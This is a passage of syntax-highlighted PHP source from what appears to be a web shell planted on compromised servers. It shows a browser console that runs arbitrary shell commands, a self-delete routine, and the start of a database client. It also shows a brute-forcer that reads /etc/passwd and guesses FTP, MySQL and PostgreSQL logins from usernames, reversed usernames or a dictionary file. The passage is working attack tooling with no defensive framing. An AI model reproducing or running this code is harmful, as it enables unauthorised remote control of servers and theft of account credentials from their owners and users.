<span class="lineno"> 939</span> <span class="x">        if(cur &lt; cmds.length) </span>
<span class="lineno"> 940</span> <span class="x">            document.cf.cmd.value = cmds[cur]; </span>
<span class="lineno"> 941</span> <span class="x">        else </span>
<span class="lineno"> 942</span> <span class="x">            cur--; </span>
<span class="lineno"> 943</span> <span class="x">    } </span>
<span class="lineno"> 944</span> <span class="x">} </span>
<span class="lineno"> 945</span> <span class="x">function add(cmd) { </span>
<span class="lineno"> 946</span> <span class="x">    cmds.pop(); </span>
<span class="lineno"> 947</span> <span class="x">    cmds.push(cmd); </span>
<span class="lineno"> 948</span> <span class="x">    cmds.push(&quot;&quot;); </span>
<span class="lineno"> 949</span> <span class="x">    cur = cmds.length-1; </span>
<span class="lineno"> 950</span> <span class="x">} </span>
<span class="lineno"> 951</span> <span class="x">&lt;/script&gt; </span>
<span class="lineno"> 952</span> <span class="cp">&lt;?php</span> 
<span class="lineno"> 953</span>     <span class="k">echo</span> <span class="s1">&#39;&lt;h1&gt;Console&lt;/h1&gt;&lt;div class=content&gt;&lt;form name=cf onsubmit=&quot;if(document.cf.cmd.value==\&#39;clear\&#39;){document.cf.output.value=\&#39;\&#39;;document.cf.cmd.value=\&#39;\&#39;;return false;}add(this.cmd.value);if(this.ajax.checked){a(null,null,this.cmd.value);}else{g(null,null,this.cmd.value);} return false;&quot;&gt;&lt;select name=alias&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 954</span>     <span class="k">foreach</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;aliases&#39;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$n</span> <span class="o">=&gt;</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 955</span>         <span class="k">if</span><span class="p">(</span><span class="nv">$v</span> <span class="o">==</span> <span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 956</span>             <span class="k">echo</span> <span class="s1">&#39;&lt;optgroup label=&quot;-&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$n</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;-&quot;&gt;&lt;/optgroup&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 957</span>             <span class="k">continue</span><span class="p">;</span> 
<span class="lineno"> 958</span>         <span class="p">}</span> 
<span class="lineno"> 959</span>         <span class="k">echo</span> <span class="s1">&#39;&lt;option value=&quot;&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&quot;&gt;&#39;</span><span class="o">.</span><span class="nv">$n</span><span class="o">.</span><span class="s1">&#39;&lt;/option&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 960</span>     <span class="p">}</span> 
<span class="lineno"> 961</span>     <span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ajax&#39;</span><span class="p">])</span><span class="o">&amp;&amp;!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> 
<span class="lineno"> 962</span>         <span class="nv">$_SESSION</span><span class="p">[</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;ajax&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span> 
<span class="lineno"> 963</span>     <span class="k">echo</span> <span class="s1">&#39;&lt;/select&gt;&lt;input type=button onclick=&quot;add(document.cf.alias.value);if(document.cf.ajax.checked){a(null,null,document.cf.alias.value);}else{g(null,null,document.cf.alias.value);}&quot; value=&quot;&gt;&gt;&quot;&gt; &lt;input type=checkbox name=ajax value=1 &#39;</span><span class="o">.</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;ajax&#39;</span><span class="p">]</span><span class="o">?</span><span class="s1">&#39;checked&#39;</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&gt; send using AJAX&lt;br/&gt;&lt;textarea class=bigarea name=output style=&quot;border-bottom:0;margin:0;&quot; readonly&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 964</span>     <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> <span class="p">{</span> 
<span class="lineno"> 965</span>         <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="s2">&quot;$ &quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span><span class="nx">ex</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]));</span> 
<span class="lineno"> 966</span>     <span class="p">}</span> 
<span class="lineno"> 967</span>     <span class="k">echo</span> <span class="s1">&#39;&lt;/textarea&gt;&lt;input type=text name=cmd style=&quot;border-top:0;width:100%;margin:0;&quot; onkeydown=&quot;kp(event);&quot;&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 968</span>     <span class="k">echo</span> <span class="s1">&#39;&lt;/form&gt;&lt;/div&gt;&lt;script&gt;document.cf.cmd.focus();&lt;/script&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 969</span>     <span class="nx">printFooter</span><span class="p">();</span> 
<span class="lineno"> 970</span> <span class="p">}</span> 
<span class="lineno"> 971</span> 
<span class="lineno"> 972</span> <span class="k">function</span> <span class="nf">actionLogout</span><span class="p">()</span> <span class="p">{</span> 
<span class="lineno"> 973</span>     <span class="nb">unset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">])]);</span> 
<span class="lineno"> 974</span>     <span class="k">echo</span> <span class="s1">&#39;bye!&#39;</span><span class="p">;</span> 
<span class="lineno"> 975</span> <span class="p">}</span> 
<span class="lineno"> 976</span> 
<span class="lineno"> 977</span> <span class="k">function</span> <span class="nf">actionSelfRemove</span><span class="p">()</span> <span class="p">{</span> 
<span class="lineno"> 978</span>     <span class="nx">printHeader</span><span class="p">();</span> 
<span class="lineno"> 979</span>     <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;yes&#39;</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 980</span>         <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nb">unlink</span><span class="p">(</span><span class="nx">SELF_PATH</span><span class="p">))</span> 
<span class="lineno"> 981</span>             <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Shell has been removed&#39;</span><span class="p">);</span> 
<span class="lineno"> 982</span>         <span class="k">else</span> 
<span class="lineno"> 983</span>             <span class="k">echo</span> <span class="s1">&#39;unlink error!&#39;</span><span class="p">;</span> 
<span class="lineno"> 984</span>     <span class="p">}</span> 
<span class="lineno"> 985</span>     <span class="k">echo</span> <span class="s1">&#39;&lt;h1&gt;Suicide&lt;/h1&gt;&lt;div class=content&gt;Really want to remove the shell?&lt;br&gt;&lt;a href=# onclick=&quot;g(null,null,\&#39;yes\&#39;)&quot;&gt;Yes&lt;/a&gt;&lt;/div&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 986</span>     <span class="nx">printFooter</span><span class="p">();</span> 
<span class="lineno"> 987</span> <span class="p">}</span> 
<span class="lineno"> 988</span> 
<span class="lineno"> 989</span> <span class="k">function</span> <span class="nf">actionBruteforce</span><span class="p">()</span> <span class="p">{</span> 
<span class="lineno"> 990</span>     <span class="nx">printHeader</span><span class="p">();</span> 
<span class="lineno"> 991</span>     <span class="k">if</span><span class="p">(</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;proto&#39;</span><span class="p">])</span> <span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 992</span>         <span class="k">echo</span> <span class="s1">&#39;&lt;h1&gt;Results&lt;/h1&gt;&lt;div class=content&gt;&lt;span&gt;Type:&lt;/span&gt; &#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;proto&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39; &lt;span&gt;Server:&lt;/span&gt; &#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;server&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;&lt;br&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 993</span>         <span class="k">if</span><span class="p">(</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;proto&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;ftp&#39;</span> <span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 994</span>             <span class="k">function</span> <span class="nf">bruteForce</span><span class="p">(</span><span class="nv">$ip</span><span class="p">,</span><span class="nv">$port</span><span class="p">,</span><span class="nv">$login</span><span class="p">,</span><span class="nv">$pass</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 995</span>                 <span class="nv">$fp</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ftp_connect</span><span class="p">(</span><span class="nv">$ip</span><span class="p">,</span> <span class="nv">$port</span><span class="o">?</span><span class="nv">$port</span><span class="o">:</span><span class="mi">21</span><span class="p">);</span> 
<span class="lineno"> 996</span>                 <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$fp</span><span class="p">)</span> <span class="k">return</span> <span class="k">false</span><span class="p">;</span> 
<span class="lineno"> 997</span>                 <span class="nv">$res</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ftp_login</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="nv">$login</span><span class="p">,</span> <span class="nv">$pass</span><span class="p">);</span> 
<span class="lineno"> 998</span>                 <span class="o">@</span><span class="nb">ftp_close</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span> 
<span class="lineno"> 999</span>                 <span class="k">return</span> <span class="nv">$res</span><span class="p">;</span> 
<span class="lineno">1000</span>             <span class="p">}</span> 
<span class="lineno">1001</span>         <span class="p">}</span> <span class="k">elseif</span><span class="p">(</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;proto&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;mysql&#39;</span> <span class="p">)</span> <span class="p">{</span> 
<span class="lineno">1002</span>             <span class="k">function</span> <span class="nf">bruteForce</span><span class="p">(</span><span class="nv">$ip</span><span class="p">,</span><span class="nv">$port</span><span class="p">,</span><span class="nv">$login</span><span class="p">,</span><span class="nv">$pass</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno">1003</span>                 <span class="nv">$res</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysql_connect</span><span class="p">(</span><span class="nv">$ip</span><span class="o">.</span><span class="s1">&#39;:&#39;</span><span class="o">.</span><span class="nv">$port</span><span class="o">?</span><span class="nv">$port</span><span class="o">:</span><span class="mi">3306</span><span class="p">,</span> <span class="nv">$login</span><span class="p">,</span> <span class="nv">$pass</span><span class="p">);</span> 
<span class="lineno">1004</span>                 <span class="o">@</span><span class="nb">mysql_close</span><span class="p">(</span><span class="nv">$res</span><span class="p">);</span> 
<span class="lineno">1005</span>                 <span class="k">return</span> <span class="nv">$res</span><span class="p">;</span> 
<span class="lineno">1006</span>             <span class="p">}</span> 
<span class="lineno">1007</span>         <span class="p">}</span> <span class="k">elseif</span><span class="p">(</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;proto&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;pgsql&#39;</span> <span class="p">)</span> <span class="p">{</span> 
<span class="lineno">1008</span>             <span class="k">function</span> <span class="nf">bruteForce</span><span class="p">(</span><span class="nv">$ip</span><span class="p">,</span><span class="nv">$port</span><span class="p">,</span><span class="nv">$login</span><span class="p">,</span><span class="nv">$pass</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno">1009</span>                 <span class="nv">$str</span> <span class="o">=</span> <span class="s2">&quot;host=&#39;&quot;</span><span class="o">.</span><span class="nv">$ip</span><span class="o">.</span><span class="s2">&quot;&#39; port=&#39;&quot;</span><span class="o">.</span><span class="nv">$port</span><span class="o">.</span><span class="s2">&quot;&#39; user=&#39;&quot;</span><span class="o">.</span><span class="nv">$login</span><span class="o">.</span><span class="s2">&quot;&#39; password=&#39;&quot;</span><span class="o">.</span><span class="nv">$pass</span><span class="o">.</span><span class="s2">&quot;&#39; dbname=&#39;&#39;&quot;</span><span class="p">;</span> 
<span class="lineno">1010</span>                 <span class="nv">$res</span> <span class="o">=</span> <span class="o">@</span><span class="nb">pg_connect</span><span class="p">(</span><span class="nv">$server</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;:&#39;</span><span class="o">.</span><span class="nv">$server</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">?</span><span class="nv">$server</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">:</span><span class="mi">5432</span><span class="p">,</span> <span class="nv">$login</span><span class="p">,</span> <span class="nv">$pass</span><span class="p">);</span> 
<span class="lineno">1011</span>                 <span class="o">@</span><span class="nb">pg_close</span><span class="p">(</span><span class="nv">$res</span><span class="p">);</span> 
<span class="lineno">1012</span>                 <span class="k">return</span> <span class="nv">$res</span><span class="p">;</span> 
<span class="lineno">1013</span>             <span class="p">}</span> 
<span class="lineno">1014</span>         <span class="p">}</span> 
<span class="lineno">1015</span>         <span class="nv">$success</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> 
<span class="lineno">1016</span>         <span class="nv">$attempts</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> 
<span class="lineno">1017</span>         <span class="nv">$server</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;server&#39;</span><span class="p">]);</span> 
<span class="lineno">1018</span>         <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno">1019</span>             <span class="nv">$temp</span> <span class="o">=</span> <span class="o">@</span><span class="nb">file</span><span class="p">(</span><span class="s1">&#39;/etc/passwd&#39;</span><span class="p">);</span> 
<span class="lineno">1020</span>             <span class="k">if</span><span class="p">(</span> <span class="nb">is_array</span><span class="p">(</span><span class="nv">$temp</span><span class="p">)</span> <span class="p">)</span> 
<span class="lineno">1021</span>                 <span class="k">foreach</span><span class="p">(</span><span class="nv">$temp</span> <span class="k">as</span> <span class="nv">$line</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno">1022</span>                     <span class="nv">$line</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">,</span> <span class="nv">$line</span><span class="p">);</span> 
<span class="lineno">1023</span>                     <span class="o">++</span><span class="nv">$attempts</span><span class="p">;</span> 
<span class="lineno">1024</span>                     <span class="k">if</span><span class="p">(</span> <span class="nx">bruteForce</span><span class="p">(</span><span class="o">@</span><span class="nv">$server</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="o">@</span><span class="nv">$server</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$line</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="nv">$line</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="p">)</span> <span class="p">{</span> 
<span class="lineno">1025</span>                         <span class="nv">$success</span><span class="o">++</span><span class="p">;</span> 
<span class="lineno">1026</span>                         <span class="k">echo</span> <span class="s1">&#39;&lt;b&gt;&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$line</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;&lt;/b&gt;:&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$line</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;&lt;br&gt;&#39;</span><span class="p">;</span> 
<span class="lineno">1027</span>                     <span class="p">}</span> 
<span class="lineno">1028</span>                     <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;reverse&#39;</span><span class="p">])</span> <span class="p">{</span> 
<span class="lineno">1029</span>                         <span class="nv">$tmp</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span> 
<span class="lineno">1030</span>                         <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$line</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span><span class="o">-</span><span class="mi">1</span><span class="p">;</span> <span class="nv">$i</span><span class="o">&gt;=</span><span class="mi">0</span><span class="p">;</span> <span class="o">--</span><span class="nv">$i</span><span class="p">)</span> 
<span class="lineno">1031</span>                             <span class="nv">$tmp</span> <span class="o">.=</span> <span class="nv">$line</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="nv">$i</span><span class="p">];</span> 
<span class="lineno">1032</span>                         <span class="o">++</span><span class="nv">$attempts</span><span class="p">;</span> 
<span class="lineno">1033</span>                         <span class="k">if</span><span class="p">(</span> <span class="nx">bruteForce</span><span class="p">(</span><span class="o">@</span><span class="nv">$server</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="o">@</span><span class="nv">$server</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$line</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="nv">$tmp</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span> 
<span class="lineno">1034</span>                             <span class="nv">$success</span><span class="o">++</span><span class="p">;</span> 
<span class="lineno">1035</span>                             <span class="k">echo</span> <span class="s1">&#39;&lt;b&gt;&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$line</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;&lt;/b&gt;:&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">);</span> 
<span class="lineno">1036</span>                         <span class="p">}</span> 
<span class="lineno">1037</span>                     <span class="p">}</span> 
<span class="lineno">1038</span>                 <span class="p">}</span> 
<span class="lineno">1039</span>         <span class="p">}</span> <span class="k">elseif</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno">1040</span>             <span class="nv">$temp</span> <span class="o">=</span> <span class="o">@</span><span class="nb">file</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;dict&#39;</span><span class="p">]);</span> 
<span class="lineno">1041</span>             <span class="k">if</span><span class="p">(</span> <span class="nb">is_array</span><span class="p">(</span><span class="nv">$temp</span><span class="p">)</span> <span class="p">)</span> 
<span class="lineno">1042</span>                 <span class="k">foreach</span><span class="p">(</span><span class="nv">$temp</span> <span class="k">as</span> <span class="nv">$line</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno">1043</span>                     <span class="nv">$line</span> <span class="o">=</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$line</span><span class="p">);</span> 
<span class="lineno">1044</span>                     <span class="o">++</span><span class="nv">$attempts</span><span class="p">;</span> 
<span class="lineno">1045</span>                     <span class="k">if</span><span class="p">(</span> <span class="nx">bruteForce</span><span class="p">(</span><span class="nv">$server</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="o">@</span><span class="nv">$server</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;login&#39;</span><span class="p">],</span> <span class="nv">$line</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span> 
<span class="lineno">1046</span>                         <span class="nv">$success</span><span class="o">++</span><span class="p">;</span> 
<span class="lineno">1047</span>                         <span class="k">echo</span> <span class="s1">&#39;&lt;b&gt;&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;login&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;&lt;/b&gt;:&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$line</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&lt;br&gt;&#39;</span><span class="p">;</span> 
<span class="lineno">1048</span>                     <span class="p">}</span> 
<span class="lineno">1049</span>                 <span class="p">}</span> 
<span class="lineno">1050</span>         <span class="p">}</span> 
<span class="lineno">1051</span>         <span class="k">echo</span> <span class="s2">&quot;&lt;span&gt;Attempts:&lt;/span&gt; </span><span class="si">$attempts</span><span class="s2"> &lt;span&gt;Success:&lt;/span&gt; </span><span class="si">$success</span><span class="s2">&lt;/div&gt;&lt;br&gt;&quot;</span><span class="p">;</span> 
<span class="lineno">1052</span>     <span class="p">}</span> 
<span class="lineno">1053</span>     <span class="k">echo</span> <span class="s1">&#39;&lt;h1&gt;FTP bruteforce&lt;/h1&gt;&lt;div class=content&gt;&lt;table&gt;&lt;form method=post&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;Type&lt;/span&gt;&lt;/td&gt;&#39;</span> 
<span class="lineno">1054</span>         <span class="o">.</span><span class="s1">&#39;&lt;td&gt;&lt;select name=proto&gt;&lt;option value=ftp&gt;FTP&lt;/option&gt;&lt;option value=mysql&gt;MySql&lt;/option&gt;&lt;option value=pgsql&gt;PostgreSql&lt;/option&gt;&lt;/select&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&#39;</span> 
<span class="lineno">1055</span>         <span class="o">.</span><span class="s1">&#39;&lt;input type=hidden name=c value=&quot;&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;&quot;&gt;&#39;</span> 
<span class="lineno">1056</span>         <span class="o">.</span><span class="s1">&#39;&lt;input type=hidden name=a value=&quot;&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;&quot;&gt;&#39;</span> 
<span class="lineno">1057</span>         <span class="o">.</span><span class="s1">&#39;&lt;input type=hidden name=charset value=&quot;&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;&quot;&gt;&#39;</span> 
<span class="lineno">1058</span>         <span class="o">.</span><span class="s1">&#39;&lt;span&gt;Server:port&lt;/span&gt;&lt;/td&gt;&#39;</span> 
<span class="lineno">1059</span>         <span class="o">.</span><span class="s1">&#39;&lt;td&gt;&lt;input type=text name=server value=&quot;127.0.0.1&quot;&gt;&lt;/td&gt;&lt;/tr&gt;&#39;</span> 
<span class="lineno">1060</span>         <span class="o">.</span><span class="s1">&#39;&lt;tr&gt;&lt;td&gt;&lt;span&gt;Brute type&lt;/span&gt;&lt;/td&gt;&#39;</span> 
<span class="lineno">1061</span>         <span class="o">.</span><span class="s1">&#39;&lt;td&gt;&lt;label&gt;&lt;input type=radio name=type value=&quot;1&quot; checked&gt; /etc/passwd&lt;/label&gt;&lt;/td&gt;&lt;/tr&gt;&#39;</span> 
<span class="lineno">1062</span>         <span class="o">.</span><span class="s1">&#39;&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;label style=&quot;padding-left:15px&quot;&gt;&lt;input type=checkbox name=reverse value=1 checked&gt; reverse (login -&gt; nigol)&lt;/label&gt;&lt;/td&gt;&lt;/tr&gt;&#39;</span> 
<span class="lineno">1063</span>         <span class="o">.</span><span class="s1">&#39;&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;label&gt;&lt;input type=radio name=type value=&quot;2&quot;&gt; Dictionary&lt;/label&gt;&lt;/td&gt;&lt;/tr&gt;&#39;</span> 
<span class="lineno">1064</span>         <span class="o">.</span><span class="s1">&#39;&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;table style=&quot;padding-left:15px&quot;&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;Login&lt;/span&gt;&lt;/td&gt;&#39;</span> 
<span class="lineno">1065</span>         <span class="o">.</span><span class="s1">&#39;&lt;td&gt;&lt;input type=text name=login value=&quot;komsen&quot;&gt;&lt;/td&gt;&lt;/tr&gt;&#39;</span> 
<span class="lineno">1066</span>         <span class="o">.</span><span class="s1">&#39;&lt;tr&gt;&lt;td&gt;&lt;span&gt;Dictionary&lt;/span&gt;&lt;/td&gt;&#39;</span> 
<span class="lineno">1067</span>         <span class="o">.</span><span class="s1">&#39;&lt;td&gt;&lt;input type=text name=dict value=&quot;&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;passwd.dic&quot;&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&#39;</span> 
<span class="lineno">1068</span>         <span class="o">.</span><span class="s1">&#39;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=submit value=&quot;&gt;&gt;&quot;&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt;&lt;/table&gt;&#39;</span><span class="p">;</span> 
<span class="lineno">1069</span>     <span class="k">echo</span> <span class="s1">&#39;&lt;/div&gt;&lt;br&gt;&#39;</span><span class="p">;</span> 
<span class="lineno">1070</span>     <span class="nx">printFooter</span><span class="p">();</span> 
<span class="lineno">1071</span> <span class="p">}</span> 
<span class="lineno">1072</span> 
<span class="lineno">1073</span> <span class="k">function</span> <span class="nf">actionSql</span><span class="p">()</span> <span class="p">{</span> 
<span class="lineno">1074</span>     <span class="k">class</span> <span class="nc">DbClass</span> <span class="p">{</span> 
<span class="lineno">1075</span>         <span class="k">var</span> <span class="nv">$type</span><span class="p">;</span> 
<span class="lineno">1076</span>         <span class="k">var</span> <span class="nv">$link</span><span class="p">;</span> 
<span class="lineno">1077</span>         <span class="k">var</span> <span class="nv">$res</span><span class="p">;</span> 
<span class="lineno">1078</span>         <span class="k">function</span> <span class="nf">DbClass</span><span class="p">(</span><span class="nv">$type</span><span class="p">)</span>    <span class="p">{</span> 
<span class="lineno">1079</span>             <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">type</span> <span class="o">=</span> <span class="nv">$type</span><span class="p">;</span> 
<span class="lineno">1080</span>         <span class="p">}</span> 
<span class="lineno">1081</span>         <span class="k">function</span> <span class="nf">connect</span><span class="p">(</span><span class="nv">$host</span><span class="p">,</span> <span class="nv">$user</span><span class="p">,</span> <span class="nv">$pass</span><span class="p">,</span> <span class="nv">$dbname</span><span class="p">){</span> 
<span class="lineno">1082</span>             <span class="k">switch</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">type</span><span class="p">)</span>    <span class="p">{</span> 
<span class="lineno">1083</span>                 <span class="k">case</span> <span class="s1">&#39;mysql&#39;</span><span class="o">:</span> 
<span class="lineno">1084</span>                     <span class="k">if</span><span class="p">(</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">link</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysql_connect</span><span class="p">(</span><span class="nv">$host</span><span class="p">,</span><span class="nv">$user</span><span class="p">,</span><span class="nv">$pass</span><span class="p">,</span><span class="k">true</span><span class="p">)</span> <span class="p">)</span> <span class="k">return</span> <span class="k">true</span><span class="p">;</span> 
<span class="lineno">1085</span>                     <span class="k">break</span><span class="p">;</span> 
<span class="lineno">1086</span>                 <span class="k">case</span> <span class="s1">&#39;pgsql&#39;</span><span class="o">:</span> 
<span class="lineno">1087</span>                     <span class="nv">$host</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">,</span> <span class="nv">$host</span><span class="p">);</span> 
